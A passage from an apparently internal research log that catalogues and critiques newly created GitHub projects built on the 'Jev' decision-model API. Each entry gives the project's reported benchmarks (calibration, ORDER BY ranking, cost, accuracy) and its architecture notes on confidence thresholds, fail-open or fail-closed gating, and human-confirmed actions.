   attention≠correctness (`notes.md` §58): an engine number
   is not a coaching verdict; a Noul is not a proof the move
   was a blunder. Formal methods compose with soft judgment
   without laundering the Noul as Stockfish. Cards:
   `formal-methods.md`; `mixed-architecture.md`; `faq.md`.
   Pillar: search/control + formal. Hole: gate (interrupt) /
   triage (error class). Family: closed decision API.

5. **[`epiphany-dynamics/port-cleanup`](https://github.com/epiphany-dynamics/port-cleanup)**
   (Swift; MIT; created 2026-09-19T00:58:50Z; 0★). Native
   macOS utility: evidence-backed, **human-confirmed**
   cleanup of stale listening TCP ports. Never kills
   automatically. Jev recommends Stop / Keep open / Your
   decision; the human is the only kill trigger (select row,
   red button, confirm the exact list). Before SIGTERM the
   app re-checks UID, executable path, microsecond start
   identity, cwd, shield status, and exact listening
   endpoints — and re-checks again immediately before
   signalling. A changed or protected process is skipped.
   Shields (executable + project folder + exact port set)
   **override Jev**. A familiar product name alone is not a
   keep rule.

   Displayed explanations are **app-owned mapped text** from
   validated typed responses, **not raw model prose**. Kill
   recommendations need confidence **≥ 0.8** and evidence the
   current provenance adapter supports; unsupported claims
   fall back to "Your decision." One paid request per explicit
   click; no retry, no background polling. API failure leaves
   local evidence intact. TCP only; no privileged helper;
   tiny final race remains (macOS has no pidfd-style checked
   kill). Gate UX pattern for Augustus + rh-guard cousin:
   judge proposes; policy + identity check + human confirm
   the irreversible act; mapped reasons so the model never
   owns the words the operator reads. Distinct from toolgate
   (pre-exec of a proposed agent tool) and from interlock
   (secrets never in the agent). Cards:
   `applied-mappings.md` §7; `mixed-architecture.md` fail
   table; `agent-self-assessment.md`. **Empirical** as README
   safety model. Do not copy Keychain / `swift run` how-to.

### MED (toolbelt / patterns; brief)

- **[`1jehuang/jev-pr-labeler`](https://github.com/1jehuang/jev-pr-labeler)**
  (Python; MIT; created 2026-09-19T01:07:20Z; 0★). Semantic
  PR labels by **conceptual scope, not line counts**. Fixed
  taxonomy; the model never invents names. Default confidence
  **0.75** (lower of confidence and selected-choice p);
  unknown/low-conf abstain. `security` and `breaking-change`
  are never automatically removed. Manual workflow-state
  labels (`needs-tests` / `blocked` / `ready-to-merge`) are
  never proposed by Jev. Labels must not authorize merges.
  Line counts detect patch truncation only. Do not copy
  Actions SHA / OpenRouter key how-to.
- **[`RubyBrewsday/jevcumber`](https://github.com/RubyBrewsday/jevcumber)**
  (TypeScript; MIT; created 2026-09-19T01:05:17Z; 0★).
  Cucumber `.feature` only — no step-definition glue. Jev
  **picks among observed controls and literals already in the
  step**; never writes code or invents values. Lockfile
  (`*.feature.lock.json`) makes replay deterministic (no API
  in CI `--frozen`). Refuse below confidence **0.6**.
  Meaning-as-spec: Gherkin is the spec; resolution is a
  pointer among candidates the page already shows. Same
  family as applied-mappings §2 / Stagehand pick-and-copy /
  jev-e2e. Do not copy npm-from-GitHub-tarball how-to.
- **[`shkumbinhasani/typedecide`](https://github.com/shkumbinhasani/typedecide)**
  (TypeScript; MIT; created 2026-09-19T00:51:14Z; 0★).
  Provider-agnostic TS SDK for **decision models** (`d.choice`
  / `d.probability` / `d.score`); TypeSafe + OpenRouter
  adapters; capability-checked at compile time. Pre-release;
  **not on npm**. Class SDK, not a TypeSafe how-to. Noul has
  no provider confidence — they refuse to invent one.
- **[`douglance/jevon`](https://github.com/douglance/jevon)**
  (Rust; MIT; created 2026-09-19T01:43:33Z; 0★). `jev` CLI +
  MCP for the TypeSafe API (not the SDK; that is
  `typesafe-sdk-rs`). Commands annotated read-only. `jev mcp
  add` writes **no environment** — a key does not belong in
  an agent config file. Toolbelt, not a placement.
- **[`buberlo/dsh-jev`](https://github.com/buberlo/dsh-jev)**
  (TypeScript; MIT; created 2026-09-19T00:49:47Z; 0★). Jev
  decision layer for DeepSeek Harness. A model answer can
  only **gate** (`ask` / `hold` / `deny`), never widen a
  permission. Failure never produces an allow. Live TypeSafe
  **not executed** this repo (mock tests). Not published to
  npm. Shadow mode still transmits state — logged as a
  warning. Cousin of toolgate / dsh plugin surface.
- **[`zaycruz/fast-jev-compaction-pi`](https://github.com/zaycruz/fast-jev-compaction-pi)**
  (TypeScript; MIT; created 2026-09-19T00:55:54Z; 0★). pi
  port of `tamaratran/fast-jev-compaction`: verbatim drop,
  never summarize; `session_before_compact`. Their bench
  (large, real Jev): compaction ~**50×** faster than pi's
  LLM summary; pure mode drops old tool calls; 
  `preserveCallInputs: true` restores 35/35 commands + 14/14
  paths. Fallback to built-in summary on any failure. Same
  *job* as fast-jev-compaction / gliner25-compaction; host is
  pi. Do not copy `pi install` how-to.
- **[`planstack-ai/jev-tetris-benchmark`](https://github.com/planstack-ai/jev-tetris-benchmark)**
  (TypeScript; MIT; created 2026-09-19T01:18:24Z; 0★).
  Harbor-shaped Tetris: code enumerates ≤12 legal placements;
  Jev Choice vs Claude Haiku 4.5 under identical boards. Use-
  case demo, **not a rigorous eval**. Same "legal set in
  code, model picks" hole as jev-plays-games / jev-testbench.
- **[`fabricioctelles/modelsystem`](https://github.com/fabricioctelles/modelsystem)**
  (license MIT; language null; created 2026-09-19T01:18:12Z;
  **1★**). Public contribution surface for
  [modelsystem.one](https://modelsystem.one) — curated catalog
  of System One / decision models. Independent; **not
  affiliated** with TypeSafe. Cousin of jevable.com (living
  atlas) at catalog-of-models rather than catalog-of-apps.
- **[`emirbartu/opencode-system-one`](https://github.com/emirbartu/opencode-system-one)**
  (TypeScript; **license null this pass**; created
  2026-09-19T00:28:02Z; **1★**). OpenCode V2 plugin: Jev via
  OpenRouter alpha Decisions for skill/tool routing. Every
  call **fails open**. Tail of conversation including
  tool-result bodies is sent (up to `stateBudget`). Not
  affiliated with OpenCode. Do not copy plugin JSON.
- **[`phanngoc/browser-ai`](https://github.com/phanngoc/browser-ai)**
  (MIT; language null this pass; created 2026-09-19T01:23:13Z;
  0★). Jev-driven browser agent in pure Go (CDP pipe or
  attach). Built to measure real end-to-end speed. Status:
  **design done, implementation tracked**. Cousin of
  jev-ultrafast (Python). Do not invent a vs-Ultrafast table.
- **[`acorn181/semantic-bookmark`](https://github.com/acorn181/semantic-bookmark)**
  (TypeScript; MIT; created 2026-09-19T01:35:18Z; 0★).
  User-authored semantic bookmark rules; Jev classifies the
  page; Chrome performs the deterministic action. Early
  prototype; key in `chrome.storage.local`. English-as-config
  cousin of hunch, on bookmarks rather than Ruby control flow.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. A capability kernel, a
control plane around DSPy, a native-probability arena, a
Wave 0 chess PRD, and a human-confirmed port killer are
**not** that drop. Stockfish WASM is text-state + engine
eval, not pixels.

### Cross-links

Cards: `applied-mappings.md` §2 (jevcumber), §7 (capability
kernel + human-confirmed gate); `mappings.md` §8 (interlock
sensor≠constraint), §18 (closed action space / human kill);
`mixed-architecture.md` (fail table + gallery: kernel,
control plane, engine-owns-truth, mapped explanations);
`validation.md` (jev-arena Brier/ECE; dspy-control-plane
metrics; tetris demo; sonar/vickrey/bracket); `faq.md`
(type-safe ≠ correct; Jev is sensor not policy; Ax/DSPy
knobs vs control plane; native vs verbalized confidence);
`optimizer-integration.md`; `formal-methods.md` (Stockfish
truth / Jev judgment; anti-soundness-theater); `mental-models.md`;
`methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`. No wrapper.

## 60. Domain LoRA specialist vs few-shot hosted, decide→policy→LLM leftover cascade, ORDER BY calibration≠sortable, GLiFormer wire-compat backend, sysone gateway (2026-09-18 ~20:43 Boise)

America/Boise ~20:43 = 2026-09-19T02:43Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no pip/hook/venv/.env/uv/npm/bun/Modal how-to, no copied
ports or key-file paths. No invented metrics. Do not re-fold
§50–§59. TypeSafe Jev is the documented exemplar, not the
monopoly. Augustus stays how-to-apply / mental model /
architecture / toolbelt + jevals/Harbor practice — **not** a
thin Jev skill.

Four HIGH **usage / architecture / measurement** signals plus
one MED gateway: a domain LoRA specialist trained on
independent gold (train when downstream code reads the
probability distribution; few-shot hosted API when only
argmax matters — calibration/VOI gold); a Harbor-shaped
decide→policy→LLM leftover cascade with three compare arms
(jev vs gen-json vs gen-logprob) and Noul 0.5 = cannot-tell
never rounded; independent measurement of ORDER BY over Jev
probs (pairwise inversion, Score ordinality, tie coarseness —
passes gates, sort-key is the weak link, calibration ≠
sortable); a wire-compat self-hosted `/v1/systemone` on
GLiFormer-400M as a class-backend economics exemplar; a
loopback gateway that routes hosted Jev + local OpenJev /
NanoJev / Mini-Jev. Backend-agnostic
categorization/scoring/decision-only class.

### HIGH

1. **[`help-er/Domain-jev-maker`](https://github.com/help-er/Domain-jev-maker)**
   (Python; MIT; created 2026-09-19T02:17:54Z; 0★ this pass).
   Agent recipe to train a **jev-like custom local model**
   tuned to a domain. One LoRA over Qwen2.5-1.5B-Instruct,
   pointer readout over an order-invariant option layout,
   cross-entropy to **soft targets** (not one-hot). Serves
   `POST /v1/systemone`. Do not copy train flags / GPU how-to.

   **Labels are independent.** Banking and travel from
   CLINC-150 human annotations. Hosted `jev-latest` is a
   **benchmark only** — neither model was trained on Jev
   outputs. Distinguish
   [`openjev-lm`](https://huggingface.co/openjev/openjev-lm)
   / [`jev-gate-student-b`](https://huggingface.co/SargeDev/jev-gate-student-b)
   (teacher-copy distill of Jev answers). This is a
   specialist on **public gold**, not a clone of the hosted
   API.

   **Their RESULTS.md (matched-precision KL).** Hosted API
   rounds probabilities to two decimals; 94.4% of 22,537
   returned entries are exactly `0.0`. A KL against a
   rounded zero is floor-determined. They round **both**
   systems to two decimals, replace zeros with 0.0025
   (midpoint of `[0, 0.005)`), renormalise. Held-out n=1,173
   each domain; 0 train/test verbatim overlap; soft-target
   fraction 45%.

   Zero-shot hosted vs local 1.5B (banking / travel):

   - KL 0.580 / 0.168 banking; 0.573 / 0.124 travel
   - r(H_true, H_pred) +0.343 / +0.933 banking; +0.428 /
     +0.950 travel
   - determinate acc 0.952 / 0.966 banking; 0.936 / 0.974
     travel

   Few-shot hosted (one labelled example per intent in
   `state`, 300 items): determinate acc **0.982** banking /
   **0.976** travel — matching or beating local (McNemar
   p=0.134 / p=1.000). Calibration barely moves: KL still
   2.5–3.8× higher; r ~half of local.

   **Their conclusion (fold this, not the train script):**
   the specialist's advantage is **calibration**, not
   accuracy. Choose on what consumes the output. **Argmax
   routing: hosted API with examples. Threshold, deferral,
   or expected-cost logic that reads the probability: the
   specialist.** That is VOI / cost-sensitive placement
   (`mappings.md` §2, §6): pay for a local head iff
   downstream *uses* the distribution. Do not invent a
   vs-Jev bake-off beyond their card.

2. **[`skiingfalcon/jav-email-cascade`](https://github.com/skiingfalcon/jav-email-cascade)**
   (Python; **license null this pass**; created
   2026-09-19T02:28:24Z; 0★). Repo name is `jav-`; README
   title is `jev-email-cascade`. Proof of a specific
   cascade: **typed decide → ordinary policy → generative
   leftover.** 74 synthetic labelled business emails.
   Harbor-shaped compare arms on the **same** 8-question
   contract:

   ```
   email → prepare (strip quoted history/signature, cap)
        → DECIDE: one backend, 8 typed questions
             jev         1 call, native p
             gen-json    1 call, self-reported confidence
             gen-logprob 8 constrained tokens, top_logprobs
        → POLICY: auto / review / llm  (plain Python)
        → REPORT: accuracy, calibration, routes, cost
   ```

   Shared `Answer` schema so policy, LLM hook, and report
   never know the backend. **Noul 0.5 = cannot-tell, never
   rounded.** Score confidence 0.0 = flat distribution,
   never acted on. `injection_suspected` always forces
   review. LLM hook optional: unset → review, run still
   completes. Cost *theirs*: ~$0.034 / 1k emails at
   $0.042/M input.

   **Mock finding (theirs, not a live Jev vs Haiku
   bake-off):** gen-json self-reported confidence came back
   essentially flat → almost none cleared the acting
   threshold; gen-logprob works but 8× calls. A real
   jev vs gen-json vs gen-logprob comparison will differ
   and is the point of running it live. Do not invent
   that table.

   **Data-hosting caveat (theirs):** hosted Jev is a
   compliance decision for real customer email. The cascade
   shape does not change: `DecisionBackend` is the seam for
   a local head. Distinct from
   [`dual-process-ai`](https://github.com/taro1985/dual-process-ai)
   (S1/S2 metaphor; routing accuracy **unmeasured**). This
   repo ships labeled emails, three decide backends, and a
   compare report. Do not copy uv / `.env` how-to.

3. **[`yodablocks/jev-orderby-bench`](https://github.com/yodablocks/jev-orderby-bench)**
   (Python; MIT; created 2026-09-19T01:31:53Z; 0★).
   Independent measurement: does `ORDER BY` over a Jev
   probability put rows in a defensible order? **Not a
   fourth DuckDB extension** — colliber / recodelabs /
   Query-farm / pg-jev already ship `ORDER BY`; none
   measured whether the order is defensible. Vendor 67.8%
   agreement with averaged frontier judgments is **not
   calibration**. Corpus is 20 Newsgroups human labels;
   **corpus text is not committed**.

   **Headline (theirs, 2026-09-18):** `jev-1.13.0` **passes
   all six pre-registered gates** on 360 rows. Boolean
   inversion **0.036**; Score ordinal inversion **0.143**
   vs 0.15 threshold — the **weak link and the sort key**;
   negation asymmetry 0.016 but = paraphrase 0.016 (not
   about negation); underconfident in 8/10 bins (mean
   signed gap +0.042). Brier 0.0524; ECE 0.0453.

   **Calibration ≠ sortable.** Two families come apart:
   ECE/Brier ask "is a stated 0.7 really 70%?"; pairwise
   inversion / Spearman / Kendall ask "does sorting by this
   put rows in the right order?" A model squashed into
   [0.48, 0.52] can have ECE 0.485 and zero inversions;
   a well-calibrated model can still invert pairs a sorted
   page shows. `ORDER BY` depends on the ranking family.
   Score ordinality is the number to re-measure before
   production sorting; the binary inversion 0.037 cannot
   see mis-ordering within positives.

   **Sort key is coarse.** Two-decimal probs; 360 rows →
   45 distinct values; **53 rows tie at 0.99** so
   `ORDER BY prob DESC LIMIT 20` is an engine-dependent
   sample of that tie, not a ranking. Score: 54 rows tied
   at 3.0. Mitigations (theirs, architecture not SQL
   how-to): treat LIMIT k as a filter on the whole tie
   group; break ties with a second question or Score
   confidence; at minimum a deterministic secondary key.
   `udf.register()` refuses SQL unless `results.json`
   records a passing gate.

   **Request shape changes the numbers.** Same 360 rows:
   recodelabs default 40-row batching **fails the ranking
   gate** (inversion 0.171 vs 0.15) that one-row-per-
   request passes. Position effect, not wording: slots
   24–39 move ~0.42. `jev_batch_size = 1` tracks the
   baseline. Integration is part of the measurement.
   7/360 ambiguous negatives excluded from gated ECE, kept
   for ranking. Do not copy curl / key how-to.

4. **[`logan-markewich/jeff`](https://github.com/logan-markewich/jeff)**
   (Python; **license null this pass**; created
   2026-09-19T02:17:25Z; 0★). Wire-compat self-hosted
   `POST /v1/systemone` on
   [`knowledgator/gliformer-large-v1`](https://huggingface.co/knowledgator/gliformer-large-v1)
   (400M). Official `typesafe-sdk` drop-in via
   `TYPESAFE_BASE_URL`. Supports choice / score / noul.
   **Encoder GLiFormer backend, not a Jev replica.**
   Probabilities: normalized sigmoids, T=3.2; noul
   isolation default; choice/score share a pass unless
   `JEFF_ISOLATE=all`. Tokens are DeBERTa counts — **not
   comparable to Jev billing**. Distinguish
   [`jev-local`](https://github.com/us/jev-local) (stub
   until hf), [`kev`](https://github.com/jaredpalmer/kev)
   (trained pointer), [`von`](https://github.com/wfzyx/von)
   (tiny SAN), [`jevify`](https://github.com/Mintzs/jevify)
   (uncalibrated CUDA likelihoods). GLiFormer is the
   Knowledgator encoder lineage (related to GLiNER),
   serving the System One *wire*, not a GLiNER locate
   head.

   **Their RESULTS.md / README (1,600 items, eight
   datasets, 2026-09-18).** Sequential p50 from a laptop:
   jeff-on-L4 151 ms vs jev 129 ms. Cost **per 1M
   single-question requests**: jev ≈ **$15.6**; L4 HTTP
   ingress cap ≈ **$2.6 (~6×)**; A10G called **directly**
   ≈ **$0.65 (~24×)**. Compare per request, not per token.
   AG News 75.5% vs 90.5%. Averaged: choice acc 0.69 vs
   0.61, score MAE 0.48 vs 0.61, noul AUROC 0.975 vs 0.84.
   Gap is small on SST-2 / SMS spam; large on BoolQ /
   irony / AG News (inference vs lexical cues). jeff is
   over-confident at T=1; T=3.2 halves ECE. Sharing one
   prompt moves nouls (spread up to 0.98); isolation
   removes it. **CPU arm is not a cheaper tier** — 6–20×
   *more* expensive than hosted jev on their 8-core Modal
   table. Product decision: wire-compat encoder backend
   when you own the GPU path and accept the accuracy gap;
   hosted when reasoning-heavy quality matters. Do not
   copy uv / Modal how-to. Do not invent a vs-Jev quality
   ranking beyond their card.

### MED (toolbelt)

- **[`hraness/sysone`](https://github.com/hraness/sysone)**
  (TypeScript; MIT; created 2026-09-19T02:32:00Z; 0★).
  Local **loopback** System One gateway: one
  Jev-compatible `POST /v1/systemone` on the machine,
  routed across hosted Jev (when a key exists) and local
  Jev-like runners (OpenJev / NanoJev / Mini-Jev) you
  already own. Policies: auto / prefer-local /
  prefer-hosted / local-only / hosted-only. Does **not**
  install, download, or run weights. Hosted is
  pass-through. Credential from the environment, **never
  the config file**. Early: no auth, no streaming, no
  non-loopback. A router is not a model. Distinct from
  jeff (it *is* a scorer) and jev-local (it *is* a
  surface+stub). Do not copy bun / bind-address how-to.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. A domain LoRA on CLINC
labels, an email cascade, an ORDER BY harness, a
GLiFormer encoder serving `/v1/systemone`, and a loopback
router are **not** that drop. GLiFormer is text encoder,
not omni perception.

### Cross-links

Cards: `applied-mappings.md` §8 (decide→policy→LLM leftover);
`mappings.md` §2 (specialist vs few-shot when policy reads
p), §4 (ORDER BY / calibration≠sortable); `mixed-architecture.md`
(fail table + gallery: cascade, encoder backend, loopback
router); `validation.md` (Domain-jev-maker KL/r/McNemar;
jav-email-cascade compare arms; jev-orderby-bench six
gates + request-shape; jeff cost/accuracy); `faq.md`
(train specialist vs few-shot hosted; Noul 0.5 cannot-tell;
calibration ≠ sortable; local `/v1/systemone` ≠ Jev);
`judgment-class.md` (GLiFormer jeff vs GLiNER vs Jev;
Domain LoRA vs teacher-copy distill); `mental-models.md`;
`methods-catalog.md`; `toolbox-mapping.md`;
`agent-self-assessment.md`; `optimizer-integration.md`.
No wrapper.

## 61. Active-learning triage / don't distill Jev as teacher, evidence-packet explorer, meaning-grep, closed-vote CU, Jev vs MLX PCD Harbor, host-owned waymode, OMP/pi fail-open gates (2026-09-18 ~21:39 Boise)

America/Boise ~21:39 = 2026-09-19T03:39Z. Docs-only fold into
open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
competing PR. Archer 27B drop still **WATCH**. Identity lock vs
`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
no pip/hook/venv/.env/uv/npm/bun/run.sh/port how-to, no copied
key-file paths. No invented metrics. Do not re-fold §50–§60.
TypeSafe Jev is the documented exemplar, not the monopoly.
Augustus stays how-to-apply / mental model / architecture /
toolbelt + jevals/Harbor practice — **not** a thin Jev skill.
Backend-agnostic categorization/scoring/decision-only class.

Seven HIGH **usage / architecture / measurement** signals:
active-learning triage that spends expensive labels only where
confidence says they change the outcome (and names the
anti-pattern: do **not** distill Jev as teacher of record);
an index-once ask-many explorer that returns citable evidence
packets instead of grepping; line-level meaning-grep with
AND/OR/NOT over Nouls; a closed-vote-only computer-use harness
with **no planner LLM**; a Harbor-shaped Jev vs local MLX PCD
vs AR JSON bake-off on toxic-chat (calibration is the quality
gap); a host-owned product surface that keeps handlers and
permissions in the app; OMP/pi acceptance gating + subagent
routing that **fails open**. Skip two empty placeholders.

### HIGH

1. **[`ThyFriendlyFox/jev-triage`](https://github.com/ThyFriendlyFox/jev-triage)**
   (Python; MIT; created 2026-09-19T03:37:23Z; 0★ this pass).
   Active-learning pipeline: high confidence **accept**; middling
   queue for an expensive teacher (VLM / audio LM / frontier LLM);
   low or near-boundary queue for **human**. Logs **full
   distributions** (not argmax) to `soft_labels.jsonl` for a
   local student. Do not copy pip / `.env` how-to.

   **Noul belief strength** is `|p − 0.5| × 2` (Noul has no native
   confidence field). Choice/Score use returned `confidence`.
   Noul near 0.5 or Choice top-two within **0.15** → human
   regardless of confidence.

   **Anti-pattern (fold this, not the CLI):** **do not distill
   Jev as teacher of record.** Author: ~**68% ceiling compounds
   errors**. Real outcome labels (shop costs, emulator pass/fail,
   human adjudication) remain the training targets. Soft labels
   are a bootstrap: train a local head on logged pairs, measure
   against real outcomes, cut the cord when the local model
   wins. Choice → KL on `soft_target`; Noul → BCE; Score →
   ordinal / distribution loss. Compare ECE **and** accuracy on
   held-out **real** labels.

   Cost sketch *theirs*: ~$21 Jev filter vs ~$8,400 LLM judge
   for 1M × 500-tok (their 400×). Distinguish
   [`help-er/Domain-jev-maker`](https://github.com/help-er/Domain-jev-maker)
   (independent CLINC gold specialist — train when downstream
   *reads* p) from
   [`openjev-lm`](https://huggingface.co/openjev/openjev-lm) /
   [`jev-gate-student-b`](https://huggingface.co/SargeDev/jev-gate-student-b)
   (teacher-copy of Jev answers). This repo is **training-data
   VOI / calibration**, not a specialist trainer and not a
   clone. Audio path: Whisper → transcript → Jev for *lexical*
   questions; acoustic questions need an audio teacher —
   transcript labels cannot teach acoustics.

2. **[`jimmyhealer/jev-semantic-explorer`](https://github.com/jimmyhealer/jev-semantic-explorer)**
   (Python; MIT; created 2026-09-19T03:21:01Z; 0★; spoken name
   **jevex**). MCP `codebase_investigate`: index once, ask many.
   Chunks + BM25 shortlist, then Jev ranks (official line-by-line
   cookbook at repo scale). Returns a **citable evidence packet**:
   `source_of_truth`, tests, callers, `regions` with path + line
   range, `status`. Read-only. Not a patcher. Not a chat model.
   Not Python-only (TS/Go/Rust/docs if Grep would see it). Do
   not copy pip / `.mcp.json` how-to.

   **Their `docs/performance.md` (author-run).** Claude Code
   fixture A/B (`eval/runs/claude_ab.json`, five questions on
   `fixtures/sample_app`): **6.8 → 2.2 files**, **8.6 → 3.2
   tool calls**, 22.6 s → 16.4 s, recall 1.0. SWE-bench
   Verified **n=8** (`eval/runs/agent8.json`): the same coding
   agent **returned an answer on 1/8 without jevex and 6/8 with
   it** (~6×), at about half the model bill. Empty output counts
   as a miss. Packet vs BM25 on SWE-Explore Python n=50: HitFile
   **0.233** vs **0.159**, CtxEff 0.345 vs 0.151, files 7.8 vs
   10.2, Jev **$0.078** (~$0.0016/question). Author: do **not**
   use 0.23 as the product number; paper Claude Code HitFile
   0.667 is a different job (the agent, not the packet). n=8 is
   small. Cite 1/8→6/8 as *their* completion card **and** the
   author-run / empty-as-miss caveats. Distinct from
   [`Bentlybro/jevgrep`](https://github.com/Bentlybro/jevgrep)
   (packed meaning-search, no index),
   [`kbhuw/jev-sift`](https://github.com/kbhuw/jev-sift)
   (classify-first I/O), and
   [`GreyssonEnterprises/s1-graphify-indexer`](https://github.com/GreyssonEnterprises/s1-graphify-indexer)
   (GLiNER extract + escalate-S2). Judgment over grep.

3. **[`uehaj/jev-semgrep`](https://github.com/uehaj/jev-semgrep)**
   (JavaScript/Node; LICENSE **MIT**, GitHub license
   **NOASSERTION**; created 2026-09-19T03:18:28Z; 0★). Zero-dep
   Node 20.12+ (`fetch` only). Per-line Noul against a meaning;
   AND/OR/NOT (`-e` OR, `-a` AND, `-v` AND NOT). Default 30
   lines/request × 8 concurrent. **Cross-lingual JP↔EN** — no
   translation step. Name collides with Semgrep static analysis.
   Distinct from jevgrep (file/chunk packed search). Toolbelt
   primitive. Do not copy npm / key-file how-to.

   LLM-as-judge test *theirs*: precision **0.94**, recall
   **0.98** on 10 cases × 51-line mixed EN/JP corpus. Japanese
   meanings wobble more near threshold; English is safer when
   borderline (TypeSafe documents English as most accurate).
   Probabilities drift ~±0.05 between runs. Author: batching 30
   vs one-line-per-request does not change p. Not a Harbor
   taskset.

4. **[`buluoray/JevOnly`](https://github.com/buluoray/JevOnly)**
   (Python; Apache-2.0; created 2026-09-19T03:24:36Z; 0★).
   Closed-vote-only harness: **code builds every option** from
   environment state, the goal, and an explicit fact register;
   **Jev only picks**. **No planner LLM. No helper LLM. No free
   text.** Type without generation: values from the goal, a
   caller-supplied fact, or text copied from the page. Verify
   the effect; undo what did not work. Irreversible `risk ≥
   0.50` never runs on a default. Environment-agnostic core;
   first env is Chromium. Distinct from Stagehand (LLM
   fallback), Cua-S1 (not TypeSafe Jev), solari-reflex /
   gliner2-ultrafast (observe→score→act **with** a surrounding
   product loop that still may call a writer). Pure System-One
   computer-use architecture. Do not copy `run.sh` / port 7791
   how-to.

   Worked example *theirs*: Wikipedia tallest-building compare —
   **11 steps, 43 Jev calls, ~340k tokens, ~$0.014, 17 s**.
   Closed vocabulary: cannot compose arbitrary free text.
   Without a code-owned completion check, stopping is Jev's
   judgment rather than a verified postcondition (`DONE` ≠
   success, same honesty as gliner2-ultrafast).

5. **[`mallahyari/system-one-benchmark`](https://github.com/mallahyari/system-one-benchmark)**
   (Python; **license null** this pass; created
   2026-09-19T03:35:00Z; 0★). Harbor-shaped three-way:
   TypeSafe `jev-1.13.0` vs local MLX **PCD**
   (Qwen2.5-1.5B 4-bit, Apple Silicon) vs local AR JSON
   (same 1.5B) on LMSYS [`lmsys/toxic-chat`](https://huggingface.co/datasets/lmsys/toxic-chat)
   **n=50**. Clone URL in README still `your-username`
   placeholder. Do not copy pip / `.env` how-to. n=50 is
   small — *their* card, not a large Harbor taskset.

   **Their table (guardrails, 50 samples):**

   | | Jev-1.13.0 | local MLX PCD | local AR JSON |
   |---|---|---|---|
   | Forward passes | 1 (O(1)) | 1 (O(1)) | ~30.8 |
   | p50 | 356.5 ms (HTTPS) | 227.2 ms | 735.3 ms |
   | Accuracy | **84.0%** | 52.0% | 54.0% |
   | Precision | 90.9% (1 FP) | 36.0% (16 FP) | 38.5% |
   | Recall | 58.8% | 52.9% | 58.8% |
   | F1 | 0.714 | 0.429 | 0.465 |
   | Brier | **0.1096** | 0.3884 (uncalibrated) | N/A (raw strings) |
   | Schema errors | 0% | 0% | 98% (1 crash) |

   **Fold the architecture, not a vs-Jev ranking beyond their
   card:** PCD proves **O(1) speed** (96.8% fewer forward
   passes; 3.2× vs AR; 94.0% concordance with AR). RLCD /
   Jev-class calibration is the quality gap (Brier 0.1096 vs
   0.3884). Softmax over allowed tokens ≠ Noul. Cousin of
   [DMB](https://github.com/nibzard/decision-model-benchmark),
   [open-jev-laya-bench](https://github.com/convaiinnovations/open-jev-laya-bench),
   [pcdServer](https://github.com/c-g-dev/pcdServer),
   [jevify](https://github.com/Mintzs/jevify) (uncalibrated
   CUDA likelihoods ≠ Noul). Banking77 50 is also in-repo;
   do not invent a number for it.

6. **[`mossburgh/waymode`](https://github.com/mossburgh/waymode)**
   (TypeScript; MIT; created 2026-09-19T02:43:12Z; 0★). Not
   previously in Augustus. App **retains** handlers, permissions,
   validation, and state. Jev selects among **live typed
   actions**; a new control enters the next snapshot without a
   matching model tool. `completed` is Jev's reading of the
   observed view — prove durable effects via **server state**.
   Default p ≥ **0.7**; 8 steps default (1–16). Jev selects the
   field; it does **not** generate fill text. Not on npm. Same
   observe→decide→guard→act→verify loop as JevOnly, but the
   **host owns the product surface** (not a harness that drives
   Chromium from outside). Distinct from Stagehand (LLM
   fallback inside a browser harness). Do not copy npm /
   AI_GATEWAY how-to.

   Evidence *theirs* (`docs/EVALS.md`): composed browser +
   OpenAPI suite **24/26** (two ambiguous requests changed a
   setting instead of asking); completion regression **34/36**
   (two renamed-setting cases abstained after the correct
   change). **Bounded development evidence, not proof every app
   is self-driving.** Same-document web / React DOM this
   release; Next.js / RN / native adapters planned, not proved.

7. **[`luw2007/omp-jev-extensions`](https://github.com/luw2007/omp-jev-extensions)**
   (TypeScript; MIT; created 2026-09-19T02:55:18Z; 0★). Two
   Oh My Pi / `@oh-my-pi/pi-coding-agent` extensions:
   `jev_acceptance_gate` (before done — Choice `{accepted,
   rejected}`, not a boolean) and `jev_route` (subagent
   topology direct/single/parallel/dag + model tier
   fast/smart/slow/task). **Fail-open** if Jev is missing,
   times out, non-2xx, or malformed; fail-open paths carry
   `confidence: 0`. Out-of-set `model_<id>` / `agent_<id>`
   answers discarded → per-agent default. Distinct from
   [`phin-tech/pi-jev-approver`](https://github.com/phin-tech/pi-jev-approver)
   (fail-closed without a key). User listed as HIGH #7. Do
   not copy bun / `~/.omp` how-to. Known gap *theirs*:
   `RouteSlice.model` tier is written; mapping onto a concrete
   provider/model is left to the host OMP config.

### Skip empty

- **[`edwardyen724-g/jev-compactor`](https://github.com/edwardyen724-g/jev-compactor)**
  — created 2026-09-19T03:31:54Z; description claims a
  framework-agnostic npm compaction+gating package; GitHub
  language null, license null, size 0. Empty placeholder.
- **[`jlt-commons/laya-jolt`](https://github.com/jlt-commons/laya-jolt)**
  — created 2026-09-19T03:08:37Z; description claims a Jolt
  implementation of Laya; language null, license null, size 0.
  Empty placeholder.

Do not invent cards. Revisit if they land content.

### Omni / Jev-omni / Archer

Still **WATCH**. No Hub weights. An active-learning triage, an
evidence-packet MCP, a meaning-grep, a closed-vote harness, a
PCD bake-off, a host-owned product surface, and OMP fail-open
gates are **not** that drop. PCD is constrained AR speed, not
omni perception. GLiFormer remains text encoder.

### Cross-links

Cards: `applied-mappings.md` §2 (closed-vote CU + host-owned
waymode), §4 (meaning-grep AND/OR/NOT; evidence-packet
explorer), §5 (OMP/pi route + acceptance), §9 (closed-vote
computer-use card); `mappings.md` §2 (don't distill Jev as
teacher; ~68% ceiling), §4 (explorer / jev-semgrep vs jevgrep),
§6 (training-data VOI); `mixed-architecture.md` (fail table +
gallery: JevOnly, waymode, omp fail-open); `validation.md`
(system-one-benchmark 84.0% / Brier 0.1096 n=50; explorer
1/8→6/8 with author-run caveats; jev-semgrep 0.94/0.98
*theirs*); `faq.md` (don't distill Jev as teacher; PCD O(1) ≠
calibrated Noul; closed-vote vs LLM-fallback CU; fail-open OMP
vs fail-closed pi-jev-approver); `judgment-class.md` (PCD
uncalibrated vs Jev RLCD); `mental-models.md`;
